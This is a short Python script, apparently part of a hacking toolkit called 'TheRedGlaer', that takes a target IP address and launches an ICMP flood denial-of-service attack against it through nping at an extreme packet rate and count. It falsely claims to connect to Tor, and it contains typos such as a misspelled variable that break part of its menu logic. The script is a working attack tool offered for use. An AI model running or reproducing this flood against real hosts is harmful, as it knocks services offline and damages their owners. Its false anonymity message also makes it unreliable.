import subprocess
import os
import time
import threading
import ipaddress

def DoS():
   print("Connecting to Tor...")
   time.sleep(3)
   os.system("clear")
   print("If you need to stop the DoS press Ctrl + C...")
   time.sleep(2)
   print("\n")
   warning = input("WARNING: We're not responsibility for any actions after this. Do yo wnat to continue? (Y/N) ")
   time.sleep(3)
   if warning == "Y":
       print("\n")
       print("Starting DoS to", dostarget, "...")
       print("--------------------------------------------------------------")
       time.sleep(2)
       subprocess.run(["nping", "--icmp", "--dest-ip", dostarget, "--data-length", "1472", "--rate", "1000000000", "--count", "1000000000"])
   elif warning == "N":
       mainmenu = input("OK.Do you want to go back to the main menu? (Y/N) ")
       if mainmenu == "Y":
           subprocess.run(["python", "TheRedGlaer.py"])
       elif mianmenu == "N":
           restart = input("Do you want to restart? (Y/N) ")
           if restart == "Y":
               subprocess.run(["python", "DoS.py"])
           elif restart == "N":
               os.system("exit")

def is_valid_ip(ip_string):
    try:
        ipaddress.ip_address(ip_string)
        return True
    except ValueError:
        return False

dostarget = input("Enter the target IP: ")
print("")
print("Checking validation...")
time.sleep(3)
if is_valid_ip(dostarget):
    print(f"{dostarget} IP is valid IP address")
    print("\n")
    print("Continuing with the DoS program...")
    time.sleep(2)
    print("\n")
    time.sleep(2)
    os.system("clear")
    time.sleep(2)
    DoS()
else:
    print(f"{dostarget} IP is invalid IP address")
    print("Try again...")
    time.sleep(3)
    os.system("clear")
    time.sleep(2)
    subprocess.run(["python", "DoS.py"])
